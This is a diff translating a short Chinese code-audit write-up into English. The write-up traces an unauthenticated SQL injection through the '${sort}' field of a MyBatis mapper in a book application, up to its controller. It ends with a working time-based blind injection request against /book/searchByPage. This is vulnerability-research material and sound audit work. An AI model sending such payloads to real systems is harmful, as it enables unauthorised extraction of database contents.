@@ -1,21 +1,20 @@
-首先在 `src\main\resources\mybatis\mapping\BookMapper.xml` 中发现 `${sort}` ，存在 sql 注入：
+First find '${sort}' in 'src\main\resources\mybatis\mapping\BookMapper.xml', there is sql injection:
 
 ![image-20250412140005967](image-20250412140005967.png)
 
-向上跟踪到 Dao 层：
+Trace up to the Dao layer:
 
 ![image-20250412140124919](image-20250412140124919.png)
 
-继续跟踪到 Service 层：
+Continue tracing to the Service layer:
 
 ![image-20250412140225533](image-20250412140225533.png)
 
-跟踪到 Controller 层：
+Trace to the Controller layer:
 
 ![image-20250412140317967](image-20250412140317967.png)
 
-该接口不存在鉴权，因此存在前台sql注入，payload：
-
+The interface has no authentication, so there is a foreground sql injection, payload:
 ```
 GET /book/searchByPage?sort=if(SUBSTR(DATABASE(),1,1)='n',sleep(1),1) HTTP/1.1
 Host: 192.168.111.71:8080
